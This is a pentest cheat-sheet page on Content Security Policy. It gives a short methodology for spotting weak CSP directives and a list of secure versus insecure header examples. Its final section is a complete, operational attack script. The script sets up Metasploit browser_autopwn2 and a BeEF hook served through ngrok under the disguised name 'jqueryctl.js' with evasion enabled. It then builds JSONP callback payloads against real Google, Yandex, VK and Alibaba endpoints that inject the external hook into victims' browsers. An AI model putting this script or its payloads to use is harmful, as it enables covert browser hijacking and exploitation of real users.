# Content Security Policy

## Check List

* [ ] Review the Content-Security-Policy header or meta element to identify misconfigurations.

## Methodology

#### CSP Misconfiguration

{% stepper %}
{% step %}
Inspect HTTP response headers of target
{% endstep %}

{% step %}
Observe the Content-Security-Policy header includes script-src 'unsafe-inline'
{% endstep %}

{% step %}
This allows inline scripts execution, weakening CSP protections against Cross-Site Scripting (XSS)
{% endstep %}

{% step %}
Although no direct exploit is shown, the presence of `unsafe-inline` increases risk of script injection attacks
{% endstep %}

{% step %}
Best practice Avoid `unsafe-inline` in `script-src` to reduce XSS attack surface
{% endstep %}
{% endstepper %}

***

#### CSP Bypass Via Percent-Encoding

{% stepper %}
{% step %}
Appending % or %" to the URL endpoint causes the browser to misinterpret or relax CSP enforcement
{% endstep %}

{% step %}
By inspecting and editing the HTML in the dev tools, an attacker can inject inline JavaScript and use this cheat sheet despite a strict script-src policy, leading to a bypass of the CSP
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### CSP Header

#### [cURL](https://curl.se/)

```bash
curl -I $WEBSITE | grep "content-security-policy"
```

### CSP Parameters

{% hint style="info" %}
default-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: default-src 'self'
```

{% hint style="info" %}
default-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: default-src *
```

{% hint style="info" %}
script-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: script-src 'self' 'nonce-random123'
```

{% hint style="info" %}
script-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: script-src 'unsafe-inline'
```

{% hint style="info" %}
style-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: style-src 'self' 'sha256-abc123'
```

{% hint style="info" %}
style-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: style-src 'unsafe-inline'
```

{% hint style="info" %}
img-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: img-src 'self' https://cdn.example.com
```

{% hint style="info" %}
img-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: img-src *
```

{% hint style="info" %}
connect-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: connect-src 'self' https://api.example.com
```

{% hint style="info" %}
connect-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: connect-src *
```

{% hint style="info" %}
font-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: font-src 'self' https://fonts.gstatic.com
```

{% hint style="info" %}
font-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: font-src *
```

{% hint style="info" %}
object-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: object-src 'none'
```

{% hint style="info" %}
object-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: object-src *
```

{% hint style="info" %}
frame-src (Secure)
{% endhint %}

```bash
Content-Security-Policy: frame-src 'self' https://trusted.example.com
```

{% hint style="info" %}
frame-src (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: frame-src *
```

{% hint style="info" %}
frame-ancestors (Secure)
{% endhint %}

```bash
Content-Security-Policy: frame-ancestors 'none'
```

{% hint style="info" %}
frame-ancestors (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: frame-ancestors *
```

{% hint style="info" %}
sandbox (Secure)
{% endhint %}

```bash
Content-Security-Policy: sandbox
```

{% hint style="info" %}
sandbox (Non-Secure)
{% endhint %}

```bash
Content-Security-Policy: sandbox allow-scripts allow-forms
```

### CSP Bypass

#### [BeEF ](https://beefproject.com/)& JSONP

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano beef-csp-bypass.sh
```

```bash
#!/bin/bash

RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

# Check for ROOT
if [[ "$(id -u)" -ne 0 ]]; then
    printf "${RED}[X] Please run as ROOT...\n"
    exit 1
fi

# Get LAN and WAN IP addresses
LAN=$(hostname -I | awk '{print $1}')
WAN=$(curl -s https://api.ipify.org)

# Kill any running ngrok or ruby instances
pkill -f 'ngrok|ruby'

# Start Metasploit
msfconsole -qx "load msgrpc ServerHost=$LAN Pass=abc123 SSL=y; use auxiliary/server/browser_autopwn2; set LHOST $WAN; set URIPATH /pwn; run -z" &>/dev/null &
sleep 1

# Start ngrok and extract public URL
ngrok http 3000 &>/dev/null &
sleep 3
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
printf "${GREEN}[*] ngrok started successfully...${RESET}\n"

# Config BeEF
if grep -q "https: false" /usr/share/beef-xss/config.yaml; then
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|#     host: "" # public|     host: "'$NGHOST'" # public|' \
           -e 's|#     port: "" # public|     port: "443" # public|g' \
           -e 's|#     https: false|     https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: "127.0.0.1"|host: "'$LAN'"|g' \
           -e 's|callback_host: "127.0.0.1"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
else
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|host: ".*" # public|host: "'$NGHOST'" # public|' \
           -e 's|port: ".*" # public|port: "443" # public|g' \
           -e 's|https: false|https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: ".*"|host: "'$LAN'"|g' \
           -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
fi

printf "${GREEN}[*] BeEF configuration updated...${RESET}\n"

# Start BeEF
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# Inject payload into JSONP callback
inject_payload()
{
    local url="$1"
    local js_payload="var script=document.createElement('script');script.src='https://${NGHOST}/jqueryctl.js';document.body.appendChild(script);"
    local encoded_callback=$(echo -n "$js_payload" | jq -sRr @uri)
    local test_url="${url/JSONP/$encoded_callback}"
    printf "%b\n" "\n${YELLOW}[*] Payload: <script src=\"${test_url}\"></script> ${RESET}\n"
}

# Target APIs for JSONP exploitation
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

# Run the attack
for target in "${targets[@]}"; do
    inject_payload "$target"
done

printf "\n"
printf "%b[*] BeEF Panel: https://${NGHOST}/ui/panel%b\n" "$CYAN" "$RESET"
printf "%b[*] BeEF USER: unk9vvn%b\n" "$CYAN" "$RESET"
printf "%b[*] BeEF PASS: 00980098%b\n" "$CYAN" "$RESET"
printf "%bBeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$WAN:8080/pwn > Execute%b\n" "$GREEN" "$RESET"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x beef-csp-bypass.sh;sudo ./beef-csp-bypass.sh
```
